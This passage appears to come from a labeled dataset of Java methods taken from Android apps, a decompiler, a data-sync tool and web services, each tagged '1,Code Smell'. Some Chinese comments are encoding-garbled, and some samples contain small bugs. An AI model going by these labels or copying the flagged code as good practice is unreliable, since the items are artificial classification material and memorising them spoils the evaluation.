      for (      BlockPos offset : offsets)       frontier.add(currentPos.offset(offset));
      continue;
    }
    BlockState stateToPlaceAt=world.getBlockState(currentPos);
    BlockState stateToPlaceOn=world.getBlockState(currentPos.relative(targetFace.getOpposite()));
    if (stateToPlaceOn.canBeReplaced())     continue;
    if (stateToPlaceOn.getBlock() != state.getBlock() && !fuzzy)     continue;
    if (!stateToPlaceAt.canBeReplaced())     continue;
    affectedPositions.add(currentPos);
    for (    BlockPos offset : offsets)     frontier.add(currentPos.offset(offset));
    continue;
  }
  return affectedPositions;
}",1,Code Smell
"private void checkRowsEnabled(){
  if (!exceptions.isEmpty()) {
    return;
  }
  int count=listView.getChildCount();
  ArrayList<Animator> animators=new ArrayList<>();
  boolean enabled=getNotificationsController().isGlobalNotificationsEnabled(currentType);
  for (int a=0; a < count; a++) {
    View child=listView.getChildAt(a);
    RecyclerListView.Holder holder=(RecyclerListView.Holder)listView.getChildViewHolder(child);
switch (holder.getItemViewType()) {
case 0:
{
        HeaderCell headerCell=(HeaderCell)holder.itemView;
        if (holder.getAdapterPosition() == messageSectionRow) {
          headerCell.setEnabled(enabled,animators);
        }
        break;
      }
case 1:
{
      TextCheckCell textCell=(TextCheckCell)holder.itemView;
      textCell.setEnabled(enabled,animators);
      break;
    }
case 3:
{
    TextColorCell textCell=(TextColorCell)holder.itemView;
    textCell.setEnabled(enabled,animators);
    break;
  }
case 5:
{
  TextSettingsCell textCell=(TextSettingsCell)holder.itemView;
  textCell.setEnabled(enabled,animators);
  break;
}
}
}
if (!animators.isEmpty()) {
if (animatorSet != null) {
animatorSet.cancel();
}
animatorSet=new AnimatorSet();
animatorSet.playTogether(animators);
animatorSet.addListener(new AnimatorListenerAdapter(){
@Override public void onAnimationEnd(Animator animator){
if (animator.equals(animatorSet)) {
  animatorSet=null;
}
}
}
);
animatorSet.setDuration(150);
animatorSet.start();
}
}",1,Code Smell
"/** 
 * Called at the end of a drag which originated on the workspace.
 */
public void onDropCompleted(final View target,final DragObject d,final boolean success){
  if (success) {
    if (target != this && mDragInfo != null) {
      removeWorkspaceItem(mDragInfo.cell);
    }
  }
 else   if (mDragInfo != null) {
    if (mDragInfo.cell instanceof LauncherAppWidgetHostView && d.dragView != null) {
      d.dragView.detachContentView(true);
    }
    final CellLayout cellLayout=mLauncher.getCellLayout(mDragInfo.container,mDragInfo.screenId);
    if (cellLayout != null) {
      cellLayout.onDropChild(mDragInfo.cell);
    }
 else     if (FeatureFlags.IS_STUDIO_BUILD) {
      throw new RuntimeException(""Invalid state: cellLayout == null in "" + ""Workspace#onDropCompleted. Please file a bug. "");
    }
  }
  View cell=getHomescreenIconByItemId(d.originalDragInfo.id);
  if (d.cancelled && cell != null) {
    cell.setVisibility(VISIBLE);
  }
  mDragInfo=null;
}
",1,Code Smell
"private void updateListViewTranslation(boolean forceZeroHeight,boolean animated){
  if (listView == null || paddedAdapter == null) {
    scrollRangeUpdateTries=0;
    return;
  }
  if (listViewHiding && listViewTranslationAnimator != null && listViewTranslationAnimator.isRunning() && forceZeroHeight) {
    scrollRangeUpdateTries=0;
    return;
  }
  boolean reversed=isReversed();
  float itemHeight;
  if (forceZeroHeight) {
    itemHeight=-containerPadding - AndroidUtilities.dp(6);
  }
 else {
    int scrollRange=listView.computeVerticalScrollRange();
    itemHeight=scrollRange - paddedAdapter.getPadding() + containerPadding;
    if (scrollRange <= 0 && adapter.getItemCountInternal() > 0 && scrollRangeUpdateTries < 3) {
      scrollRangeUpdateTries++;
      updateVisibility(true);
      return;
    }
  }
  scrollRangeUpdateTries=0;
  float newTranslationY=(reversed ? -Math.max(0,listViewPadding - itemHeight) : -listViewPadding + Math.max(0,listViewPadding - itemHeight));
  if (forceZeroHeight && !reversed) {
    newTranslationY+=listView.computeVerticalScrollOffset();
  }
  Integer updateVisibility=null;
  if (listViewTranslationAnimator != null) {
    listViewTranslationAnimator.cancel();
  }
  if (animated) {
    listViewHiding=forceZeroHeight;
    final float fromTranslation=listView.getTranslationY();
    final float toTranslation=newTranslationY;
    final float fromHideT=hideT;
    final float toHideT=forceZeroHeight ? 1 : 0;
    if (fromTranslation == toTranslation) {
      listViewTranslationAnimator=null;
      updateVisibility=forceZeroHeight ? View.GONE : View.VISIBLE;
      if (switchLayoutManagerOnEnd && forceZeroHeight) {
        switchLayoutManagerOnEnd=false;
        listView.setLayoutManager(getNeededLayoutManager());
        updateVisibility(shown=true);
      }
    }
 else {
      listViewTranslationAnimator=new SpringAnimation(new FloatValueHolder(fromTranslation)).setSpring(new SpringForce(toTranslation).setDampingRatio(SpringForce.DAMPING_RATIO_NO_BOUNCY).setStiffness(550.0f));
      listViewTranslationAnimator.addUpdateListener((anm,val,vel) -> {
        listView.setTranslationY(val);
        hideT=AndroidUtilities.lerp(fromHideT,toHideT,(val - fromTranslation) / (toTranslation - fromTranslation));
      }
);
      if (forceZeroHeight) {
        listViewTranslationAnimator.addEndListener((a,cancelled,b,c) -> {
          if (!cancelled) {
            listViewTranslationAnimator=null;
            setVisibility(forceZeroHeight ? View.GONE : View.VISIBLE);
            if (switchLayoutManagerOnEnd && forceZeroHeight) {
              switchLayoutManagerOnEnd=false;
              listView.setLayoutManager(getNeededLayoutManager());
              updateVisibility(shown=true);
            }
          }
        }
);
      }
      listViewTranslationAnimator.addEndListener((animation,canceled,value,velocity) -> {
      }
);
      listViewTranslationAnimator.start();
    }
  }
 else {
    hideT=forceZeroHeight ? 1 : 0;
    listView.setTranslationY(newTranslationY);
    if (forceZeroHeight) {
      updateVisibility=View.GONE;
    }
  }
  if (updateVisibility != null && getVisibility() != updateVisibility) {
    setVisibility(updateVisibility);
  }
}",1,Code Smell
"private static void extractStaticInitializers(ClassWrapper wrapper,MethodWrapper method){
  RootStatement root=method.root;
  StructClass cl=wrapper.getClassStruct();
  Statement firstData=Statements.findFirstData(root);
  if (firstData != null) {
    boolean inlineInitializers=cl.hasModifier(CodeConstants.ACC_INTERFACE) || cl.hasModifier(CodeConstants.ACC_ENUM);
    while (!firstData.getExprents().isEmpty()) {
      Exprent exprent=firstData.getExprents().get(0);
      boolean found=false;
      if (exprent.type == Exprent.EXPRENT_ASSIGNMENT) {
        AssignmentExprent assignExpr=(AssignmentExprent)exprent;
        if (assignExpr.getLeft().type == Exprent.EXPRENT_FIELD) {
          FieldExprent fExpr=(FieldExprent)assignExpr.getLeft();
          if (fExpr.isStatic() && fExpr.getClassname().equals(cl.qualifiedName) && cl.hasField(fExpr.getName(),fExpr.getDescriptor().descriptorString)) {
            if (inlineInitializers || isExprentIndependent(assignExpr.getRight(),method)) {
              String keyField=InterpreterUtil.makeUniqueKey(fExpr.getName(),fExpr.getDescriptor().descriptorString);
              if (!wrapper.getStaticFieldInitializers().containsKey(keyField)) {
                wrapper.getStaticFieldInitializers().addWithKey(assignExpr.getRight(),keyField);
                firstData.getExprents().remove(0);
                found=true;
              }
            }
          }
        }
      }
      if (!found) {
        break;
      }
    }
  }
}",1,Code Smell
"public void startAnimation(boolean open){
  if (animatorSet != null) {
    animatorSet.removeAllListeners();
    animatorSet.cancel();
  }
  PipRoundVideoView pipRoundVideoView=PipRoundVideoView.getInstance();
  if (pipRoundVideoView != null) {
    pipRoundVideoView.showTemporary(!open);
  }
  if (open && !opened) {
    cameraContainer.setTranslationX(0);
    textureOverlayView.setTranslationX(0);
    animationTranslationY=getMeasuredHeight() / 2f;
    updateTranslationY();
  }
  opened=open;
  if (parentView != null) {
    parentView.invalidate();
  }
  blurBehindDrawable.show(open);
  animatorSet=new AnimatorSet();
  float toX=0;
  if (!open) {
    toX=recordedTime > 300 ? AndroidUtilities.dp(24) - getMeasuredWidth() / 2f : 0;
  }
  ValueAnimator translationYAnimator=ValueAnimator.ofFloat(open ? 1f : 0f,open ? 0 : 1f);
  translationYAnimator.addUpdateListener(animation -> {
    animationTranslationY=(getMeasuredHeight() / 2f) * (float)animation.getAnimatedValue();
    updateTranslationY();
  }
);
  animatorSet.playTogether(ObjectAnimator.ofFloat(switchCameraButton,View.ALPHA,open ? 1.0f : 0.0f),ObjectAnimator.ofFloat(muteImageView,View.ALPHA,0.0f),ObjectAnimator.ofInt(paint,AnimationProperties.PAINT_ALPHA,open ? 255 : 0),ObjectAnimator.ofFloat(cameraContainer,View.ALPHA,open ? 1.0f : 0.0f),ObjectAnimator.ofFloat(cameraContainer,View.SCALE_X,open ? 1.0f : 0.1f),ObjectAnimator.ofFloat(cameraContainer,View.SCALE_Y,open ? 1.0f : 0.1f),ObjectAnimator.ofFloat(cameraContainer,View.TRANSLATION_X,toX),ObjectAnimator.ofFloat(textureOverlayView,View.ALPHA,open ? 1.0f : 0.0f),ObjectAnimator.ofFloat(textureOverlayView,View.SCALE_X,open ? 1.0f : 0.1f),ObjectAnimator.ofFloat(textureOverlayView,View.SCALE_Y,open ? 1.0f : 0.1f),ObjectAnimator.ofFloat(textureOverlayView,View.TRANSLATION_X,toX),translationYAnimator);
  if (!open) {
    animatorSet.addListener(new AnimatorListenerAdapter(){
      @Override public void onAnimationEnd(      Animator animation){
        if (animation.equals(animatorSet)) {
          hideCamera(true);
          setVisibility(INVISIBLE);
        }
      }
    }
);
  }
 else {
    setTranslationX(0);
  }
  animatorSet.setDuration(180);
  animatorSet.setInterpolator(new DecelerateInterpolator());
  animatorSet.start();
}",1,Code Smell
"@OnMessage public void onMessage(String message,Session session){
  JSONObject jsonMsg=JSON.parseObject(message);
  if (jsonMsg.getString(""msg"").equals(""ping"")) {
    Session agentSession=BytesTool.agentSessionMap.get(jsonMsg.getInteger(""agentId""));
    if (agentSession != null) {
      JSONObject pong=new JSONObject();
      pong.put(""msg"",""pong"");
      BytesTool.sendText(agentSession,pong.toJSONString());
    }
    return;
  }
  log.info(""Session :{} send message: {}"",session.getId(),jsonMsg);
switch (jsonMsg.getString(""msg"")) {
case ""battery"":
{
      devicesService.refreshDevicesBattery(jsonMsg);
      break;
    }
case ""debugUser"":
  devicesService.updateDevicesUser(jsonMsg);
break;
case ""heartBeat"":
Agents agentsOnline=agentsService.findById(jsonMsg.getInteger(""agentId""));
if (agentsOnline.getStatus() != AgentStatus.ONLINE) {
agentsOnline.setStatus(AgentStatus.ONLINE);
agentsService.saveAgents(agentsOnline);
}
break;
case ""agentInfo"":
{
Session agentSession=BytesTool.agentSessionMap.get(jsonMsg.getInteger(""agentId""));
if (agentSession != null) {
try {
agentSession.close();
}
 catch (IOException e) {
e.printStackTrace();
}
BytesTool.agentSessionMap.remove(jsonMsg.getInteger(""agentId""));
}
BytesTool.agentSessionMap.put(jsonMsg.getInteger(""agentId""),session);
jsonMsg.remove(""msg"");
agentsService.saveAgents(jsonMsg);
}
break;
case ""subResultCount"":
resultsService.subResultCount(jsonMsg.getInteger(""rid""));
break;
case ""deviceDetail"":
devicesService.deviceStatus(jsonMsg);
break;
case ""step"":
case ""perform"":
case ""record"":
case ""status"":
resultDetailService.saveByTransport(jsonMsg);
break;
case ""findSteps"":
JSONObject steps=findSteps(jsonMsg,""runStep"");
Session agentSession=BytesTool.agentSessionMap.get(jsonMsg.getInteger(""agentId""));
if (agentSession != null) {
BytesTool.sendText(agentSession,steps.toJSONString());
}
break;
case ""errCall"":
agentsService.errCall(jsonMsg.getInteger(""agentId""),jsonMsg.getString(""udId""),jsonMsg.getInteger(""tem""),jsonMsg.getInteger(""type""));
break;
}
}
",1,Code Smell
"/** 
 * 英译中
 * @param source 源
 * @return {@link String}
 */
public String translateWithClass(String source,String className,Project project){
  if (EasyDocConfig.ONLY_TRANSLATE.equals(config.getDocPriority())) {
    return translate(source);
  }
  if (StringUtils.isNotBlank(className)) {
    PsiClass aClass=JavaPsiFacade.getInstance(project).findClass(className,GlobalSearchScope.projectScope(project));
    if (aClass == null) {
      return translate(source);
    }
    PsiDocComment docComment=aClass.getDocComment();
    if (docComment == null) {
      return translate(source);
    }
    PsiElement[] descriptionElements=docComment.getDescriptionElements();
    for (    PsiElement element : descriptionElements) {
      if (element instanceof PsiDocTokenImpl) {
        String doc=element.getText().replaceAll(""[ \\n\\t*]+"","""");
        if (StringUtils.isNotBlank(doc)) {
          return doc;
        }
      }
    }
    return translate(source);
  }
 else {
    return translate(source);
  }
}
",1,Code Smell
"public String match(String matchWord){
  Word walkNode=root;
  char[] wordArray=matchWord.toCharArray();
  for (int i=0; i < wordArray.length; i++) {
    while (!walkNode.hasChild(wordArray[i]) && walkNode.failOver != null) {
      walkNode=walkNode.failOver;
    }
    if (walkNode.hasChild(wordArray[i])) {
      walkNode=walkNode.next.get(wordArray[i]);
      if (walkNode.end) {
        Word sentinelA=walkNode;
        Word sentinelB=walkNode;
        int k=i + 1;
        boolean flag=false;
        while (k < wordArray.length && sentinelA.hasChild(wordArray[k])) {
          sentinelA=sentinelA.next.get(wordArray[k]);
          k++;
          if (sentinelA.end) {
            sentinelB=sentinelA;
            flag=true;
          }
        }
        int len=flag ? sentinelB.depth : walkNode.depth;
        while (len > 0) {
          len--;
          int index=flag ? i - walkNode.depth + 1 + len : i - len;
          wordArray[index]=MASK;
        }
        i+=flag ? sentinelB.depth : 0;
        walkNode=flag ? sentinelB.failOver : walkNode.failOver;
      }
    }
  }
  return new String(wordArray);
}",1,Code Smell
"/** 
 * 鏍规嵁褰撳墠鐨勮姹傚弬鏁帮紝鐢熸垚瀵瑰簲鐨凴etrofit
 */
private Retrofit.Builder generateRetrofit(){
  if (converterFactories.isEmpty() && adapterFactories.isEmpty()) {
    Retrofit.Builder builder=getRetrofitBuilder();
    if (!TextUtils.isEmpty(baseUrl)) {
      builder.baseUrl(baseUrl);
    }
    return builder;
  }
 else {
    final Retrofit.Builder retrofitBuilder=new Retrofit.Builder();
    if (!TextUtils.isEmpty(baseUrl))     retrofitBuilder.baseUrl(baseUrl);
    if (!converterFactories.isEmpty()) {
      for (      Converter.Factory converterFactory : converterFactories) {
        retrofitBuilder.addConverterFactory(converterFactory);
      }
    }
 else {
      Retrofit.Builder newBuilder=EasyHttp.getRetrofitBuilder();
      if (!TextUtils.isEmpty(baseUrl)) {
        newBuilder.baseUrl(baseUrl);
      }
      List<Converter.Factory> listConverterFactory=newBuilder.build().converterFactories();
      for (      Converter.Factory factory : listConverterFactory) {
        retrofitBuilder.addConverterFactory(factory);
      }
    }
    if (!adapterFactories.isEmpty()) {
      for (      CallAdapter.Factory adapterFactory : adapterFactories) {
        retrofitBuilder.addCallAdapterFactory(adapterFactory);
      }
    }
 else {
      Retrofit.Builder newBuilder=EasyHttp.getRetrofitBuilder();
      List<CallAdapter.Factory> listAdapterFactory=newBuilder.baseUrl(baseUrl).build().callAdapterFactories();
      for (      CallAdapter.Factory factory : listAdapterFactory) {
        retrofitBuilder.addCallAdapterFactory(factory);
      }
    }
    return retrofitBuilder;
  }
}
",1,Code Smell
"public void initReader(FlinkXJsonBuildDto flinkxJsonDto,JobDatasource readerDatasource){
  this.readerDatasource=readerDatasource;
  this.readerTables=flinkxJsonDto.getReaderTables();
  this.readerColumns=flinkxJsonDto.getReaderColumns();
  this.hiveReaderDto=flinkxJsonDto.getHiveReader();
  this.rdbmsReaderDto=flinkxJsonDto.getRdbmsReader();
  this.hbaseReaderDto=flinkxJsonDto.getHbaseReader();
  this.clickhouseReaderDto=flinkxJsonDto.getClickhouseReader();
  String datasource=readerDatasource.getDatasource();
  if (JdbcConstants.MYSQL.equals(datasource)) {
    readerPlugin=new MysqlReader();
    buildReader=buildReader();
  }
 else   if (JdbcConstants.ORACLE.equals(datasource)) {
    readerPlugin=new OracleReader();
    buildReader=buildReader();
  }
 else   if (JdbcConstants.HANA.equals(datasource)) {
    readerPlugin=new HanaReader();
    buildReader=buildReader();
  }
 else   if (JdbcConstants.SQL_SERVER.equals(datasource)) {
    readerPlugin=new SqlServerReader();
    buildReader=buildReader();
  }
 else   if (JdbcConstants.POSTGRESQL.equals(datasource)) {
    readerPlugin=new PostgresqlReader();
    buildReader=buildReader();
  }
 else   if (JdbcConstants.CLICKHOUSE.equals(datasource)) {
    readerPlugin=new ClickHouseReader();
    buildReader=buildReader();
  }
 else   if (JdbcConstants.HIVE.equals(datasource)) {
    readerPlugin=new HiveReader();
    buildReader=buildHiveReader();
  }
 else   if (JdbcConstants.HBASE.equals(datasource)) {
    readerPlugin=new HBaseReader();
    buildReader=buildHBaseReader();
  }
 else   if (JdbcConstants.MONGODB.equals(datasource)) {
    readerPlugin=new MongoDBReader();
    buildReader=buildMongoDBReader();
  }
}
",1,Code Smell
"@NonNull private Map<String,SpannableStringBuilder> getNativeLibraryInfo(boolean trackerOnly){
  Collection<String> nativeLibsInApk=mViewModel.getNativeLibraries();
  if (nativeLibsInApk.size() == 0)   return new HashMap<>();
  String[] libNames=getResources().getStringArray(R.array.lib_native_names);
  String[] libSignatures=getResources().getStringArray(R.array.lib_native_signatures);
  int[] isTracker=getResources().getIntArray(R.array.lib_native_is_tracker);
  @SuppressWarnings(""unchecked"") List<String>[] matchedLibs=new List[libSignatures.length];
  Map<String,SpannableStringBuilder> foundNativeLibInfoMap=new ArrayMap<>();
  for (int i=0; i < libSignatures.length; ++i) {
    if (trackerOnly && isTracker[i] == 0)     continue;
    Pattern pattern=Pattern.compile(libSignatures[i]);
    for (    String lib : nativeLibsInApk) {
      if (pattern.matcher(lib).find()) {
        if (matchedLibs[i] == null) {
          matchedLibs[i]=new ArrayList<>();
        }
        matchedLibs[i].add(lib);
      }
    }
    if (matchedLibs[i] == null)     continue;
    SpannableStringBuilder builder=foundNativeLibInfoMap.get(libNames[i]);
    if (builder == null) {
      builder=new SpannableStringBuilder(getPrimaryText(mActivity,libNames[i]));
      foundNativeLibInfoMap.put(libNames[i],builder);
    }
    for (    String lib : matchedLibs[i]) {
      builder.append(""\n"").append(getMonospacedText(lib));
    }
  }
  return foundNativeLibInfoMap;
}",1,Code Smell
"public static void parseChainDocument(List<Document> documentList,Set<String> chainIdSet,Consumer<Element> parseOneChainConsumer){
  Map<String,Element> abstratChainMap=new HashMap<>();
  Set<Element> implChainSet=new HashSet<>();
  documentList.forEach(document -> {
    List<Element> chainList=document.getRootElement().elements(CHAIN);
    for (    Element e : chainList) {
      String chainId=Optional.ofNullable(e.attributeValue(ID)).orElse(e.attributeValue(NAME));
      checkChainId(chainId,e.getText());
      if (!chainIdSet.add(chainId)) {
        throw new ChainDuplicateException(StrUtil.format(""[chain name duplicate] chainName={}"",chainId));
      }
      if (!getEnableByElement(e)) {
        continue;
      }
      FlowBus.addChain(chainId);
      if (ElRegexUtil.isAbstractChain(e.getText())) {
        abstratChainMap.put(chainId,e);
        Chain chain=FlowBus.getChain(chainId);
        chain.getConditionList().add(new AbstractCondition());
      }
    }
    ;
  }
);
  chainIdSet.clear();
  for (  Document document : documentList) {
    Element rootElement=document.getRootElement();
    List<Element> chainList=rootElement.elements(CHAIN);
    for (    Element chain : chainList) {
      if (!getEnableByElement(chain)) {
        continue;
      }
      parseImplChain(abstratChainMap,implChainSet,chain);
      String chainName=Optional.ofNullable(chain.attributeValue(ID)).orElse(chain.attributeValue(NAME));
      if (!abstratChainMap.containsKey(chainName)) {
        parseOneChainConsumer.accept(chain);
      }
    }
  }
}
",1,Code Smell
"public static List<String> getResultSetFirstColumnAsString(String queryString,ExpectedErrors errors,SQLGlobalState<?,?> state) throws SQLException {
  if (state.getOptions().logEachSelect()) {
    state.getLogger().writeCurrent(queryString);
    try {
      state.getLogger().getCurrentFileWriter().flush();
    }
 catch (    IOException e) {
      e.printStackTrace();
    }
  }
  boolean canonicalizeString=state.getOptions().canonicalizeSqlString();
  SQLQueryAdapter q=new SQLQueryAdapter(queryString,errors,true,canonicalizeString);
  List<String> resultSet=new ArrayList<>();
  SQLancerResultSet result=null;
  try {
    result=q.executeAndGet(state);
    if (result == null) {
      throw new IgnoreMeException();
    }
    while (result.next()) {
      String resultTemp=result.getString(1);
      if (resultTemp != null) {
        resultTemp=resultTemp.replaceAll(""[\\.]0+$"","""");
      }
      resultSet.add(resultTemp);
    }
  }
 catch (  Exception e) {
    if (e instanceof IgnoreMeException) {
      throw e;
    }
    if (e.getMessage() == null) {
      throw new AssertionError(queryString,e);
    }
    if (errors.errorIsExpected(e.getMessage())) {
      throw new IgnoreMeException();
    }
    throw new AssertionError(queryString,e);
  }
 finally {
    if (result != null && !result.isClosed()) {
      result.close();
    }
  }
  return resultSet;
}",1,Code Smell
"public static void commitMessageRecordList(@NonNull List<Object> messages) throws ReflectiveOperationException {
  commitMessageRecordList(messages,Objects.requireNonNull(AppRuntimeHelper.getAccount(),""account == null""));
}
public static void commitMessageRecordList(@NonNull List<Object> messages,@NonNull String account) throws ReflectiveOperationException {
  Objects.requireNonNull(messages,""messages == null"");
  Objects.requireNonNull(account,""account == null"");
  if (Long.parseLong(account) < 10000) {
    throw new IllegalArgumentException(""account is invalid: "" + account);
  }
  if (messages.isEmpty()) {
    return;
  }
  Class<?> kBaseQQMessageFacade=Initiator.load(""com.tencent.imcore.message.BaseQQMessageFacade"");
  if (kBaseQQMessageFacade != null) {
    List<Method> candidates=ArraysKt.filter(kBaseQQMessageFacade.getDeclaredMethods(),it -> {
      if (it.getModifiers() != Modifier.PUBLIC || it.getReturnType() != void.class) {
        return false;
      }
      Class<?>[] types=it.getParameterTypes();
      if (types.length != 3) {
        return false;
      }
      return types[0] == List.class && types[1] == String.class && types[2] == boolean.class;
    }
);
    if (candidates.size() == 1) {
      Method m=candidates.get(0);
      m.invoke(get(),messages,account,true);
      return;
    }
  }
  if (HostInfo.requireMinQQVersion(QQVersion.QQ_8_8_93)) {
    Reflex.invokeVirtual(ManagerHelper.getQQMessageFacade(),""h"",messages,account,List.class,String.class,void.class);
  }
 else   if (HostInfo.requireMinQQVersion(QQVersion.QQ_8_6_0)) {
    Reflex.invokeVirtual(ManagerHelper.getQQMessageFacade(),""a"",messages,account,List.class,String.class,void.class);
  }
 else {
    Reflex.invokeVirtualDeclaredOrdinalModifier(ManagerHelper.getQQMessageFacade(),0,4,false,Modifier.PUBLIC,0,messages,account,List.class,String.class,void.class);
  }
}",1,Code Smell
"/** 
 * 查找带有包含注解方法的类
 * @param annotation
 * @return
 */
public static List<Class<?>> findClassWithMethodAnnotation(Class<? extends Annotation> annotation){
  List<Class<?>> childrenClasses=new ArrayList<>();
  for (  Class childClass : classes) {
    if (childClass != null) {
      for (      Method method : childClass.getDeclaredMethods()) {
        if (method.getAnnotation(annotation) != null) {
          childrenClasses.add(childClass);
          break;
        }
      }
    }
  }
synchronized (mPatchClasses) {
    for (    List<Class> patchClasses : mPatchClasses.values()) {
      for (      Class childClass : patchClasses) {
        if (childClass != null) {
          for (          Method method : childClass.getDeclaredMethods()) {
            if (method.getAnnotation(annotation) != null) {
              childrenClasses.add(childClass);
              break;
            }
          }
        }
      }
    }
  }
  return childrenClasses;
}
",1,Code Smell
"/** 
 * 鑳屽寘闂姹傛柟妗堟暟 锛侊紒锛佹澶勭殑dp琛ㄧず浣撶Н鎭板ソ鏄痠鐨勬儏鍐典笅锛屾渶澶т环鍊间负澶氬皯锛岄�氳繃鍒濆鍖杁p[0] =0,杩涜�岃〃绀烘墍鏈夌殑鐘舵�侀兘鏄粠0杞Щ杩囨潵鐨勩�� 鍥犱负鍙栧緱鏈�澶т环鍊兼椂浣跨敤鐗╁搧鐨勬柟妗堝彲鑳戒笉鍚岋紝鍗崇墿鍝佺粍鎴愮殑浣撶Н涓嶅悓锛� 鍥犳鍦ㄨ幏鍙栧埌鏈�澶т环鍊间箣鍚庨渶瀵规柟妗堟暟杩涜閬嶅巻锛岀疮鍔犮��
 * @param n
 * @param m
 * @param v
 * @param val
 * @return
 */
public int getMaxValueOfPackage(int n,int m,int[] v,int[] val){
  int[] dp=new int[m + 1];
  Arrays.fill(dp,-Integer.MIN_VALUE);
  dp[0]=0;
  int[] g=new int[m + 1];
  g[0]=1;
  for (int i=0; i < n; i++) {
    for (int j=m; j >= v[i]; j--) {
      int putVal=dp[j - v[i]] + val[i];
      int oriVal=dp[j];
      if (putVal > oriVal) {
        g[j]=g[j - v[i]];
        dp[j]=putVal;
      }
 else       if (putVal < oriVal) {
      }
 else       if (putVal == oriVal) {
        g[j]+=g[j - v[i]];
      }
    }
  }
  int max=Arrays.stream(dp).max().getAsInt();
  int res=0;
  for (int i=0; i <= m; i++) {
    if (dp[i] == max) {
      res+=g[i];
    }
  }
  return res;
}",1,Code Smell
"@Override public Map<Long,Object> queryAllFieldIdDataMap(Long dataId){
  List<ModuleFieldData> fieldDataList=getBaseMapper().getByDataId(dataId);
  ModuleFieldDataCommon fieldDataCommon=fieldDataCommonService.getByDataId(dataId);
  ModuleEntity module=ModuleCacheUtil.getActiveById(fieldDataCommon.getModuleId());
  List<ModuleField> moduleFields=fieldService.getByModuleIdAndVersion(module.getModuleId(),module.getVersion(),null);
  Map<Long,ModuleField> fieldIdMap=moduleFields.stream().collect(Collectors.toMap(ModuleField::getFieldId,Function.identity()));
  Map<String,ModuleField> fieldNameMap=moduleFields.stream().collect(Collectors.toMap(ModuleField::getFieldName,Function.identity()));
  Map<String,Object> commonDataMap=BeanUtil.beanToMap(fieldDataCommon);
  Map<Long,Object> result=new HashMap<>();
  for (  ModuleFieldData fieldData : fieldDataList) {
    Long fieldId=fieldData.getFieldId();
    ModuleField field=fieldIdMap.get(fieldId);
    if (ObjectUtil.isNull(field)) {
      continue;
    }
    ModuleFieldEnum fieldEnum=ModuleFieldEnum.parse(field.getType());
    String value=fieldData.getValue();
    if (StrUtil.isNotEmpty(value)) {
      if (ObjectUtil.equal(ModuleFieldEnum.SELECT,fieldEnum)) {
        ModuleOptionsBO optionsBO=JSON.parseObject(value,ModuleOptionsBO.class);
        result.put(fieldId,optionsBO.getValue());
      }
      if (Arrays.asList(ModuleFieldEnum.NUMBER,ModuleFieldEnum.FLOATNUMBER,ModuleFieldEnum.PERCENT).contains(fieldEnum)) {
        result.put(fieldId,new BigDecimal(value));
      }
    }
 else {
      result.put(fieldId,value);
    }
  }
  for (  Map.Entry<String,ModuleField> entry : fieldNameMap.entrySet()) {
    String fieldName=entry.getKey();
    ModuleField field=entry.getValue();
    if (commonDataMap.containsKey(fieldName)) {
      if (StrUtil.equals(""createUserName"",fieldName)) {
        result.put(field.getFieldId(),commonDataMap.get(""createUserId""));
      }
 else       if (StrUtil.equals(""ownerUserName"",fieldName)) {
        result.put(field.getFieldId(),commonDataMap.get(""ownerUserId""));
      }
 else {
        result.put(field.getFieldId(),commonDataMap.get(fieldName));
      }
    }
  }
  return result;
}
",1,Code Smell
"protected int getColor(int key){
  if (currentType == TYPE_PREVIEW) {
    return Theme.getColor(key);
  }
  if (resourcesProvider != null) {
    return resourcesProvider.getColor(key);
  }
  return Theme.getColor(key);
}
int getColor(int key);
@Override protected int getColor(int key){
  int index=colors.indexOfKey(key);
  if (index > 0) {
    return colors.valueAt(index);
  }
 else {
    return defaultColors[key];
  }
}
public static int getColor(int key,ResourcesProvider provider){
  if (provider != null) {
    return provider.getColor(key);
  }
  return getColor(key);
}
public static int getColor(int key){
  return getColor(key,null,false);
}
public static int getColor(int key,boolean[] isDefault){
  return getColor(key,isDefault,false);
}
public static int getColor(int key,boolean[] isDefault,boolean ignoreAnimation){
  if (!ignoreAnimation && animatingColors != null) {
    int index=animatingColors.indexOfKey(key);
    if (index >= 0) {
      return animatingColors.valueAt(index);
    }
  }
  if (serviceBitmapShader != null && (key_chat_serviceText == key || key_chat_serviceLink == key || key_chat_serviceIcon == key || key_chat_stickerReplyLine == key || key_chat_stickerReplyNameText == key || key_chat_stickerReplyMessageText == key)) {
    return 0xffffffff;
  }
  if (currentTheme == defaultTheme) {
    boolean useDefault;
    if (isMyMessagesBubbles(key)) {
      useDefault=currentTheme.isDefaultMyMessagesBubbles();
    }
 else     if (isMyMessages(key)) {
      useDefault=currentTheme.isDefaultMyMessages();
    }
 else     if (key_chat_wallpaper == key || key_chat_wallpaper_gradient_to1 == key || key_chat_wallpaper_gradient_to2 == key || key_chat_wallpaper_gradient_to3 == key) {
      useDefault=false;
    }
 else {
      useDefault=currentTheme.isDefaultMainAccent();
    }
    if (useDefault) {
      if (key == key_chat_serviceBackground) {
        return serviceMessageColor;
      }
 else       if (key == key_chat_serviceBackgroundSelected) {
        return serviceSelectedMessageColor;
      }
      return getDefaultColor(key);
    }
  }
  int index=currentColors.indexOfKey(key);
  int color;
  if (index < 0) {
    int fallbackKey=fallbackKeys.get(key,-1);
    if (fallbackKey != -1) {
      int fallbackIndex=currentColors.indexOfKey(fallbackKey);
      if (fallbackIndex >= 0) {
        return currentColors.valueAt(fallbackIndex);
      }
    }
    if (isDefault != null) {
      isDefault[0]=true;
    }
    if (key == key_chat_serviceBackground) {
      return serviceMessageColor;
    }
 else     if (key == key_chat_serviceBackgroundSelected) {
      return serviceSelectedMessageColor;
    }
    return getDefaultColor(key);
  }
 else {
    color=currentColors.valueAt(index);
  }
  if (key_windowBackgroundWhite == key || key_windowBackgroundGray == key || key_actionBarDefault == key || key_actionBarDefaultArchived == key) {
    color|=0xff000000;
  }
  return color;
}",1,Code Smell
"/** 
 * 鍥剧墖涓婁紶
 */
@RequestMapping(value=""/upload/files"",method=RequestMethod.POST) @ApiOperation(value=""澶氬浘涓婁紶"",notes=""wangEditor鍥剧墖涓婁紶"") public Result uploadV2(HttpServletRequest httpServletRequest,@TokenToAdminUser AdminUserToken adminUser) throws URISyntaxException {
  logger.info(""adminUser:{}"",adminUser.toString());
  List<MultipartFile> multipartFiles=new ArrayList<>(8);
  if (standardServletMultipartResolver.isMultipart(httpServletRequest)) {
    MultipartHttpServletRequest multiRequest=(MultipartHttpServletRequest)httpServletRequest;
    Iterator<String> iter=multiRequest.getFileNames();
    int total=0;
    while (iter.hasNext()) {
      if (total > 5) {
